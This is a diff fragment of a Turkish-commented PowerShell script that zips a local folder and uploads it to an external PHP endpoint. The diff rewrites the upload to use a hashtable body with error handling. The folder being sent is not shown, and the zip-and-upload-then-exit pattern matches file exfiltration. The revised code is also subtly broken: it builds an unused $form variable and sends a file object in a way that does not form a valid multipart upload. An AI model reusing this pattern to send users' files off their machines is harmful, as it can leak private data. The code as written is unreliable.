@@ -86,34 +86,34 @@ if (Test-Path $zipFilePath) {
 # Klasörü ZIP dosyasına sıkıştırma
 Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath
 
+
 # Yüklemek istediğiniz dosyanın yolu
-$filePath = $zipFilePath
+if (Test-Path $zipFilePath) {
+    $filePath = $zipFilePath
 
-# PHP dosya yükleme URL'si
-$url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
+    # PHP dosya yükleme URL'si
+    $url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
 
-# Dosya akışını oluşturma
-$fileStream = [System.IO.File]::OpenRead($filePath)
-$boundary = "---------------------------" + [Guid]::NewGuid().ToString()
-$body = "--$boundary`r`n" +
-        "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$($filePath.Substring($filePath.LastIndexOf('\') + 1))`"`r`n" +
-        "Content-Type: application/octet-stream`r`n`r`n"
+    # Dosya yüklemek için form data oluşturma
+    $form = @{
+        fileToUpload = Get-Item $filePath
+    }
 
-# Byte dizisini oluşturma
-$byteArray = [System.Text.Encoding]::UTF8.GetBytes($body)
-$httpRequestStream = [System.IO.MemoryStream]::new()
-$httpRequestStream.Write($byteArray, 0, $byteArray.Length)
-$fileStream.CopyTo($httpRequestStream)
-$fileStream.Close()
-$footer = "`r`n--$boundary--`r`n"
-$footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)
-$httpRequestStream.Write($footerBytes, 0, $footerBytes.Length)
-$httpRequestStream.Position = 0
+    # Dosya yüklemek için Body ayarlama
+    $body = @{
+        fileToUpload = Get-Item $filePath
+    }
 
-# HTTP isteği gönderme
-$response = Invoke-RestMethod -Uri $url -Method Post -Body $httpRequestStream -ContentType "multipart/form-data; boundary=$boundary"
-
-# Yanıtı yazdırma
-Write-Output $response
+    # POST isteği gönderme
+    try {
+        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "multipart/form-data" -ErrorAction Stop
+        # Yanıtı yazdırma
+        Write-Output $response
+    } catch {
+        Write-Host "Dosya yüklenirken bir hata oluştu: $_"
+    }
+} else {
+    Write-Host "ZIP dosyası oluşturulamadığı için yükleme yapılmadı."
+}
 
 exit
